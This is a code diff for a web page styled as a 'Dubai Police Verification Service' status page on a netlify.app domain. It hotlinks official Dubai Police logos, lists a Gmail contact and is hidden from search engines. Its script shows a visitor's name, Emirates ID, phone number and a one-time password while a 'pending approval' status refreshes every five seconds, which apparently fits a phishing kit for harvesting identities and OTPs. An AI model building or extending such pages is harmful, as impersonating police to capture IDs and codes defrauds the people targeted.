@@ -3,36 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy Policy - Dubai Police Verification Service | Data Protection & Security</title>
-    <meta name="description" content="Read our comprehensive Privacy Policy. Learn how Dubai Police Verification Service protects your personal data with advanced encryption and UAE data protection compliance.">
-    <meta name="keywords" content="privacy policy, data protection, UAE data laws, Dubai Police security, personal information, GDPR compliance, data encryption">
+    <title>Check Verification Status - Track Your Application | Dubai Police Service</title>
+    <meta name="description" content="Track your verification application status in real-time. Check police clearance, Emirates ID, bank verification, and UAE Pass applications with instant updates and OTP verification.">
+    <meta name="keywords" content="verification status, track application, police clearance status, Emirates ID check, application tracking, OTP verification, Dubai Police tracking">
     <meta name="author" content="Dubai Police Verification Service">
-    <meta name="robots" content="index, follow">
-    <link rel="canonical" href="https://uaelegalstatus.netlify.app/privacy-policy">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="canonical" href="https://uaelegalstatus.netlify.app/status">
     
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://uaelegalstatus.netlify.app/privacy-policy">
-    <meta property="og:title" content="Privacy Policy - Dubai Police Verification Service">
-    <meta property="og:description" content="Learn how we protect your personal data with advanced encryption and comply with UAE data protection regulations.">
+    <meta property="og:url" content="https://uaelegalstatus.netlify.app/status">
+    <meta property="og:title" content="Check Verification Status - Dubai Police Service">
+    <meta property="og:description" content="Track your verification application status in real-time with instant updates and OTP verification.">
     <meta property="og:image" content="https://uaelegalstatus.netlify.app/wp-content/uploads/2025/02/images__8_-removebg-preview.png">
     
     <!-- Twitter -->
     <meta name="twitter:card" content="summary">
-    <meta name="twitter:url" content="https://uaelegalstatus.netlify.app/privacy-policy">
-    <meta name="twitter:title" content="Privacy Policy - Dubai Police Verification Service">
-    <meta name="twitter:description" content="Learn how we protect your personal data with advanced encryption and UAE data protection compliance.">
+    <meta name="twitter:url" content="https://uaelegalstatus.netlify.app/status">
+    <meta name="twitter:title" content="Check Verification Status - Dubai Police Service">
+    <meta name="twitter:description" content="Track your verification application status in real-time with instant updates.">
     <meta name="twitter:image" content="https://uaelegalstatus.netlify.app/wp-content/uploads/2025/02/images__8_-removebg-preview.png">
     
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet">
-    
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f5f5f5;
@@ -238,102 +237,198 @@
             margin-bottom: 10px;
             font-size: 14px;
         }
-        
-        .container {
+
+        /* Main Content */
+        .main-content {
             max-width: 1200px;
-            margin: 0 auto;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        .container {
             background: white;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            max-width: 700px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 40px;
+            text-align: center;
         }
-        
-        /* Enhanced Footer Mobile Responsiveness */
-        @media (max-width: 480px) {
-            footer {
-                padding: 40px 15px 15px;
-            }
-            
-            .footer-content {
-                grid-template-columns: 1fr;
-                gap: 30px;
-            }
-            
-            .footer-section h3 {
-                font-size: 16px;
-                margin-bottom: 15px;
-            }
-            
-            .footer-section ul li {
-                margin-bottom: 10px;
-                font-size: 14px;
-            }
-            
-            .footer-section ul li a {
-                word-wrap: break-word;
-            }
-            
-            .social-links {
-                justify-content: center;
-            }
-            
-            .social-links a {
-                width: 45px;
-                height: 45px;
-            }
-            
-            .footer-bottom {
-                padding-top: 20px;
-            }
-            
-            .footer-bottom p {
-                font-size: 12px;
-                line-height: 1.6;
-            }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
         }
-        
-        .content {
-            padding: 60px 40px;
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
         }
-        
-        .section {
-            margin-bottom: 40px;
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
         }
-        
-        .section h2 {
-            color: #00a99d;
+
+        .status-container {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        .status-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+
+        .status-icon.pending {
+            color: #ffc107;
+        }
+
+        .status-icon.approved {
+            color: #28a745;
+        }
+
+        .status-icon.rejected {
+            color: #dc3545;
+        }
+
+        .status-text {
             font-size: 24px;
-            margin-bottom: 15px;
+            font-weight: 600;
+            margin-bottom: 10px;
         }
-        
-        .section p, .section li {
-            color: #555;
-            font-size: 16px;
-            line-height: 1.8;
-            margin-bottom: 15px;
+
+        .status-text.pending {
+            color: #856404;
         }
-        
-        .section ul {
-            padding-left: 30px;
+
+        .status-text.approved {
+            color: #155724;
         }
-        
-        .back-button {
-            display: inline-block;
-            background: #00a99d;
+
+        .status-text.rejected {
+            color: #721c24;
+        }
+
+        .status-description {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .details {
+            text-align: left;
+            margin-bottom: 30px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: #666;
+            font-weight: 500;
+        }
+
+        .detail-value {
+            color: #333;
+            font-weight: 600;
+        }
+
+        .otp-box {
+            background: linear-gradient(135deg, #00a99d 0%, #008c84 100%);
             color: white;
-            padding: 15px 30px;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .otp-label {
+            font-size: 14px;
+            margin-bottom: 10px;
+            opacity: 0.9;
+        }
+
+        .otp-code {
+            font-size: 36px;
+            font-weight: 700;
+            letter-spacing: 5px;
+        }
+
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
             border-radius: 8px;
-            text-decoration: none;
             font-size: 16px;
-            font-weight: bold;
-            margin-top: 30px;
+            font-weight: 600;
+            cursor: pointer;
             transition: all 0.3s;
         }
-        
-        .back-button:hover {
-            background: #008c84;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 169, 157, 0.3);
+
+        .btn-primary {
+            background: #00a99d;
+            color: white;
         }
-        
+
+        .btn-primary:hover {
+            background: #008c84;
+        }
+
+        .btn-secondary {
+            background: #e9ecef;
+            color: #333;
+        }
+
+        .btn-secondary:hover {
+            background: #dee2e6;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00a99d;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .refresh-info {
+            font-size: 14px;
+            color: #666;
+            margin-top: 20px;
+            font-style: italic;
+        }
+
         @media (max-width: 768px) {
             .nav-links {
                 display: none;
@@ -346,13 +441,21 @@
             .page-header h1 {
                 font-size: 32px;
             }
-            
-            .content {
+
+            .container {
                 padding: 30px 20px;
             }
-            
-            .section h2 {
-                font-size: 20px;
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .otp-code {
+                font-size: 28px;
+            }
+
+            .actions {
+                flex-direction: column;
             }
 
             .footer-content {
@@ -366,10 +469,10 @@
     <div class="top-header">
         <div class="container-fluid">
             <div class="gov-logo">
-                <img src="/wp-content/uploads/2020/03/government-of-dubai-red.jpg" alt="Government of Dubai">
+                <img src="https://dubaipolice.gov.ae/wps/wcm/connect/f3504c44-b1ad-49c8-9ac7-8001e2c1e6c1/government-of-dubai-red.svg?MOD=AJPERES&CACHEID=ROOTWORKSPACE-f3504c44-b1ad-49c8-9ac7-8001e2c1e6c1-o7vZ0f3" alt="Government of Dubai">
             </div>
             <div class="dp-logo">
-                <img src="/wp-content/uploads/2020/03/download__3_-removebg-preview.png" alt="Dubai Police">
+                <img src="https://dubaipolice.gov.ae/wps/wcm/connect/d7889c1f-f7e1-4c2e-ba7f-bb0e22c8ea56/dubai-police-org.svg?MOD=AJPERES&CACHEID=ROOTWORKSPACE-d7889c1f-f7e1-4c2e-ba7f-bb0e22c8ea56-o7usDYO" alt="Dubai Police">
             </div>
         </div>
     </div>
@@ -381,7 +484,7 @@
                 <li><a href="/home">Home</a></li>
                 <li><a href="/about">About Us</a></li>
                 <li><a href="/information">Information</a></li>
-                <li><a href="/status">Verification Status</a></li>
+                <li><a href="/status" class="active">Verification Status</a></li>
                 <li><a href="/contact">Contact Us</a></li>
             </ul>
             <div class="nav-actions">
@@ -398,94 +501,42 @@
 
     <!-- Page Header -->
     <div class="page-header">
-        <h1>Privacy Policy</h1>
-        <p>Your Data Protection & Privacy Rights</p>
+        <h1>Verification Status</h1>
+        <p>Track Your Application Progress</p>
     </div>
 
-    <div class="container">
-        
-        <div class="content">
-            <div class="section">
-                <h2>1. Introduction</h2>
-                <p>This Privacy Policy explains how Dubai Police Verification Service collects, uses, and protects your personal information when you use our verification services. We are committed to ensuring that your privacy is protected.</p>
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="container">
+            <div id="loadingScreen" class="loading">
+                <div class="spinner"></div>
+                <p>Checking verification status...</p>
             </div>
-            
-            <div class="section">
-                <h2>2. Information We Collect</h2>
-                <p>We collect the following types of information:</p>
-                <ul>
-                    <li><strong>Personal Identification Information:</strong> Full name, Emirates ID number, email address, mobile number, nationality</li>
-                    <li><strong>Verification Data:</strong> Application details, OTP codes, verification status</li>
-                    <li><strong>Technical Data:</strong> IP address, browser type, device information, access times</li>
-                    <li><strong>Usage Data:</strong> How you interact with our services</li>
-                </ul>
-            </div>
-            
-            <div class="section">
-                <h2>3. How We Use Your Information</h2>
-                <p>Your information is used for:</p>
-                <ul>
-                    <li>Processing and verifying your identity</li>
-                    <li>Communicating with you about your application status</li>
-                    <li>Complying with legal and regulatory requirements</li>
-                    <li>Improving our services and user experience</li>
-                    <li>Preventing fraud and ensuring security</li>
-                </ul>
-            </div>
-            
-            <div class="section">
-                <h2>4. Data Security</h2>
-                <p>We implement appropriate security measures to protect your personal information against unauthorized access, alteration, disclosure, or destruction. All data is encrypted and stored securely in compliance with UAE data protection regulations.</p>
-            </div>
-            
-            <div class="section">
-                <h2>5. Data Sharing</h2>
-                <p>We do not sell, trade, or rent your personal information to third parties. Your information may be shared with:</p>
-                <ul>
-                    <li>UAE Government authorities for verification purposes</li>
-                    <li>Law enforcement agencies when legally required</li>
-                    <li>Service providers who assist in our operations (under strict confidentiality agreements)</li>
-                </ul>
-            </div>
-            
-            <div class="section">
-                <h2>6. Your Rights</h2>
-                <p>You have the right to:</p>
-                <ul>
-                    <li>Access your personal data</li>
-                    <li>Request correction of inaccurate data</li>
-                    <li>Request deletion of your data (subject to legal requirements)</li>
-                    <li>Withdraw consent at any time</li>
-                    <li>Lodge a complaint with relevant authorities</li>
-                </ul>
-            </div>
-            
-            <div class="section">
-                <h2>7. Data Retention</h2>
-                <p>We retain your personal information only for as long as necessary to fulfill the purposes outlined in this policy or as required by law. Verification records are typically retained for 5 years.</p>
-            </div>
-            
-            <div class="section">
-                <h2>8. Cookies and Tracking</h2>
-                <p>Our website uses cookies to enhance user experience and analyze site usage. You can control cookie settings through your browser preferences.</p>
-            </div>
-            
-            <div class="section">
-                <h2>9. Changes to This Policy</h2>
-                <p>We may update this Privacy Policy from time to time. Any changes will be posted on this page with an updated revision date. We encourage you to review this policy periodically.</p>
-            </div>
-            
-            <div class="section">
-                <h2>10. Contact Us</h2>
-                <p>If you have any questions about this Privacy Policy or our data practices, please contact us:</p>
-                <p><strong>Email:</strong> <a href="mailto:testm7369@gmail.com" style="color: #00a99d;">testm7369@gmail.com</a><br>
-                <strong>Phone:</strong> +971 56 361 4931<br>
-                <strong>Address:</strong> P.O. Box 1493, Dubai, United Arab Emirates</p>
-            </div>
-            
-            <div style="text-align: center; margin-top: 40px; padding-top: 30px; border-top: 2px solid #e0e0e0;">
-                <p style="color: #666; margin-bottom: 20px;"><strong>Last Updated:</strong> November 14, 2025</p>
-                <a href="/home" class="back-button">← Back to Home</a>
+
+            <div id="statusScreen" style="display: none;">
+                <img src="../dubailegalcheck.ae/wp-content/uploads/2025/02/images__8_-removebg-preview.png" alt="Logo" class="logo">
+                <h1>Verification Status</h1>
+                <p class="subtitle">Dubai Police Verification Service</p>
+
+                <div class="status-container">
+                    <div id="statusIcon" class="status-icon"></div>
+                    <div id="statusText" class="status-text"></div>
+                    <div id="statusDescription" class="status-description"></div>
+                </div>
+
+                <div class="details" id="applicationDetails"></div>
+
+                <div id="otpBox" class="otp-box" style="display: none;">
+                    <div class="otp-label">Your OTP Code</div>
+                    <div class="otp-code" id="otpCode"></div>
+                </div>
+
+                <div class="actions">
+                    <button class="btn btn-primary" onclick="checkStatus()">🔄 Refresh Status</button>
+                    <button class="btn btn-secondary" onclick="goHome()">← Back to Home</button>
+                </div>
+
+                <p class="refresh-info">Status updates automatically every 5 seconds</p>
             </div>
         </div>
     </div>
@@ -545,5 +596,134 @@
             </div>
         </div>
     </footer>
+
+    <script src="../js/verification-handler.js"></script>
+    <script>
+        let currentApplication = null;
+        let checkInterval = null;
+
+        // Load and display status
+        function loadStatus() {
+            // Get application from session storage
+            currentApplication = verificationHandler.getCurrentApplication();
+
+            if (!currentApplication) {
+                // Try to get from URL parameters
+                const urlParams = new URLSearchParams(globalThis.location.search);
+                const appId = urlParams.get('id');
+                
+                if (appId) {
+                    currentApplication = verificationHandler.getApplicationById(appId);
+                }
+            }
+
+            if (!currentApplication) {
+                document.getElementById('loadingScreen').innerHTML = `
+                    <h2>No Application Found</h2>
+                    <p style="margin: 20px 0;">Please submit a verification request first.</p>
+                    <button class="btn btn-primary" onclick="goHome()">Go to Home</button>
+                `;
+                return;
+            }
+
+            // Check for updated status
+            const updatedApp = verificationHandler.getApplicationById(currentApplication.id);
+            if (updatedApp) {
+                currentApplication = updatedApp;
+                sessionStorage.setItem('currentApplication', JSON.stringify(updatedApp));
+            }
+
+            displayStatus();
+        }
+
+        // Display status
+        function displayStatus() {
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('statusScreen').style.display = 'block';
+
+            const statusIcon = document.getElementById('statusIcon');
+            const statusText = document.getElementById('statusText');
+            const statusDescription = document.getElementById('statusDescription');
+            const otpBox = document.getElementById('otpBox');
+
+            // Update status display based on current status
+            if (currentApplication.status === 'pending') {
+                statusIcon.className = 'status-icon pending';
+                statusIcon.textContent = '⏳';
+                statusText.className = 'status-text pending';
+                statusText.textContent = 'Verification Pending';
+                statusDescription.textContent = 'Your application is being reviewed by our team. Please wait for approval.';
+                otpBox.style.display = 'block';
+                document.getElementById('otpCode').textContent = currentApplication.otp;
+            } else if (currentApplication.status === 'approved') {
+                statusIcon.className = 'status-icon approved';
+                statusIcon.textContent = '✅';
+                statusText.className = 'status-text approved';
+                statusText.textContent = 'Verification Successful';
+                statusDescription.textContent = 'Congratulations! Your verification has been approved.';
+                otpBox.style.display = 'none';
+            } else if (currentApplication.status === 'rejected') {
+                statusIcon.className = 'status-icon rejected';
+                statusIcon.textContent = '❌';
+                statusText.className = 'status-text rejected';
+                statusText.textContent = 'Verification Rejected';
+                statusDescription.textContent = 'Your application was not approved. Please contact support for more information.';
+                otpBox.style.display = 'none';
+            }
+
+            // Display application details
+            const detailsHtml = `
+                <div class="detail-row">
+                    <span class="detail-label">Application ID:</span>
+                    <span class="detail-value">${currentApplication.id}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Full Name:</span>
+                    <span class="detail-value">${currentApplication.fullName}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Emirates ID:</span>
+                    <span class="detail-value">${currentApplication.emiratesId}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Email:</span>
+                    <span class="detail-value">${currentApplication.email}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Mobile:</span>
+                    <span class="detail-value">${currentApplication.mobileNumber}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Submitted:</span>
+                    <span class="detail-value">${new Date(currentApplication.timestamp).toLocaleString()}</span>
+                </div>
+            `;
+
+            document.getElementById('applicationDetails').innerHTML = detailsHtml;
+        }
+
+        // Check status (refresh)
+        function checkStatus() {
+            loadStatus();
+        }
+
+        // Go to home page
+        function goHome() {
+            globalThis.location.href = '/home';
+        }
+
+        // Initialize
+        loadStatus();
+
+        // Auto-refresh every 5 seconds
+        checkInterval = setInterval(loadStatus, 5000);
+
+        // Clear interval on page unload
+        globalThis.addEventListener('beforeunload', function() {
+            if (checkInterval) {
+                clearInterval(checkInterval);
+            }
+        });
+    </script>
 </body>
 </html>
